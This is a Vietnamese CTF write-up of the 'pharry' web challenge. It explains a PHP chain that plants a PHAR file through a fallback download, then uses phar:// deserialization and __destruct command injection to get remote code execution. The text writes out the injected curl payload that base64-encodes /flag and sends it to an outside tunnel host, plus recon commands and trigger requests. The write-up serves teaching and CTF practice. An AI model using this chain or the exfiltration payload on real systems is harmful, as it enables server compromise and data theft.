# pharry writeup

## Challenge summary

Target: `https://steamed-gnocchi-dusted-with-pickled-rice-bybi.gpn24.ctf.kitctf.de`

Source chính nằm ở [pharry/index.php](/home/light/Workspace/CTF/GPN_CTF/web/pharry/pharry/index.php:1).

Flag:

```text
GPNCTF{Web_I5_f0R_WeE8S_aNd_SUck5_pHp_iS_C0oL_Tou6H}
```

## 1. Phân tích source

Code quan trọng:

```php
$file = $_GET['path'];
$res = md5_file($file);
if ($res == FALSE){
    file_put_contents("/tmp/remote_file.jpg", file_get_contents($file));
    $res = md5_file("/tmp/remote_file.jpg");
}
if ($res == 0xdeadbeef){
    echo "Congratulations! Here is not your flag: ".file_get_contents("flag.txt");
} else{
    echo $res;
}
```

và class:

```php
class User {
    public $avatar_path;
    public $name;
    public $password;
    function __construct($name, $password) {
        $this->name = $name;
        $this->password = $password;
        $this->avatar_path = "avatars/".$name.".png";
        system("touch ".$this->avatar_path);
    }
    function __destruct() {
        system("rm ".$this->avatar_path);
    }
}
```

Những điểm đáng chú ý:

1. `md5_file($file)` nhận trực tiếp input từ `$_GET['path']`, nên có thể dùng wrapper như `http://`, `https://`, `phar://`.
2. Nếu `md5_file($file)` fail, server sẽ `file_get_contents($file)` rồi ghi nội dung vào `/tmp/remote_file.jpg`.
3. `User::__destruct()` gọi `system("rm ".$this->avatar_path)`, nên nếu điều khiển được `avatar_path` thì có command injection.
4. Nhánh `if ($res == 0xdeadbeef)` chỉ in `flag.txt` trong webroot. File này chỉ là decoy.

## 2. Vì sao hướng PHAR hợp lý

Ý tưởng là:

1. Tạo một file PHAR có metadata là object `User`.
2. Gán `avatar_path` thành chuỗi kiểu `x; <command> #`.
3. Buộc server ghi PHAR đó vào `/tmp/remote_file.jpg`.
4. Gọi `md5_file("phar:///tmp/remote_file.jpg/x.txt")`.
5. Trên PHP 7.4, thao tác với `phar://` sẽ unserialize metadata của PHAR.
6. Khi object bị destroy, `__destruct()` chạy và ta có RCE.

Điểm rất quan trọng là remote không chạy cùng version với local:

- Local của máy mình là PHP `8.4.20`.
- Remote trả header `X-Powered-By: PHP/7.4.33`.

Trên local PHP 8.4, `md5_file("phar://...")` không còn tự tạo side effect deserialize như kiểu chain cũ. Nhưng remote PHP 7.4 vẫn dính, nên exploit chạy được trên server thật.

## 3. Cách ghi PHAR vào `/tmp/remote_file.jpg`

Nhánh fallback chỉ chạy khi:

- request đầu vào làm `md5_file($file)` fail
- nhưng `file_get_contents($file)` vẫn lấy được body

Nếu server bên ngoài luôn trả `200`, thì `md5_file($file)` sẽ thành công ngay và không vào fallback.

Vì vậy mình dựng một HTTP server nhỏ để cùng một URL có hành vi:

1. Lần request đầu: trả `500 Internal Server Error`
2. Lần request thứ hai: trả nội dung file PHAR thật

Như vậy trên challenge:

1. `md5_file("https://.../payload.phar")` fail vì HTTP 500
2. `file_get_contents("https://.../payload.phar")` chạy request lần hai và nhận body PHAR
3. Server ghi body đó vào `/tmp/remote_file.jpg`
4. Sau đó nó còn gọi `md5_file("/tmp/remote_file.jpg")`, nhưng việc này không ảnh hưởng gì đến bước tiếp theo

Helper local đã dùng:

- [exploit_server.py](/home/light/Workspace/CTF/GPN_CTF/web/pharry/exploit_server.py:1): server trả 500 ở lần đầu, trả payload ở lần sau
- [make_payload.php](/home/light/Workspace/CTF/GPN_CTF/web/pharry/make_payload.php:1): tạo PHAR với command tùy ý nhét vào metadata

## 4. Tạo payload PHAR

Mình tạo PHAR với metadata là object `User`, rồi nhét lệnh vào `avatar_path`:

```php
$u->avatar_path = "x;curl${IFS}https://<tunnel>/flag?f=$(base64${IFS}-w0${IFS}/flag)#";
```

Khi `__destruct()` chạy, câu lệnh thực tế server gọi sẽ có dạng:

```sh
rm x;curl https://<tunnel>/flag?f=$(base64 -w0 /flag)# 
```

Phần `rm x` fail cũng không sao, vì lệnh `curl ...` phía sau vẫn chạy.

## 5. Trigger exploit

Exploit gồm 2 request.

### Bước 1: ép server tải PHAR về `/tmp/remote_file.jpg`

```bash
curl --get \
  --data-urlencode 'path=https://<tunnel>/payload.phar?v=3' \
  'https://steamed-gnocchi-dusted-with-pickled-rice-bybi.gpn24.ctf.kitctf.de/'
```

Response lúc này sẽ là warning `md5_file(...) failed` do lần request đầu nhận HTTP 500, sau đó in ra MD5 của file vừa được ghi ở `/tmp/remote_file.jpg`.

### Bước 2: trigger `phar://`

```bash
curl --get \
  --data-urlencode 'path=phar:///tmp/remote_file.jpg/x.txt' \
  'https://steamed-gnocchi-dusted-with-pickled-rice-bybi.gpn24.ctf.kitctf.de/'
```

`md5_file()` trên `phar://...` sẽ làm PHP 7.4 deserialize metadata của PHAR. Khi object `User` bị destroy, command injection trong `__destruct()` chạy và `curl` gửi dữ liệu về tunnel của mình.

## 6. Recon trước khi lấy flag thật

Request đầu tiên mình dùng để xác nhận RCE chỉ đọc `flag.txt` trong webroot. Kết quả nhận về đúng là file decoy.

Sau đó mình đổi command sang recon:

```sh
id
pwd
ls -la /
find / -maxdepth 3 -iname '*flag*' 2>/dev/null
```

Kết quả quan trọng:

- process chạy với user `www-data`
- webroot là `/var/www/html`
- có file `/flag`

Vì vậy payload cuối cùng chỉ cần đọc `/flag`.

## 7. Lấy flag

Payload cuối:

```sh
curl https://<tunnel>/flag?f=$(base64 -w0 /flag)
```

Dữ liệu exfil nhận được:

```text
R1BOQ1RGe1dlYl9JNV9mMFJfV2VFOFNfYU5kX1NVY2s1X3BIcF9pU19DMG9MX1RvdTZIfQo=
```

Decode ra:

```text
GPNCTF{Web_I5_f0R_WeE8S_aNd_SUck5_pHp_iS_C0oL_Tou6H}
```

## 8. Kết luận

Bug chain của challenge là:

1. User-controlled path đi vào `md5_file()` và `file_get_contents()`
2. Fallback ghi file attacker-controlled vào `/tmp/remote_file.jpg`
3. `phar://` trên PHP 7.4 deserialize PHAR metadata
4. `User::__destruct()` có command injection qua `system("rm ".$this->avatar_path)`
5. Dùng RCE để đọc `/flag`

Đây là kiểu challenge khá đẹp vì local PHP 8 dễ làm người giải nghĩ rằng hướng PHAR không còn dùng được, nhưng remote lại là PHP 7.4 nên chain vẫn sống nguyên.
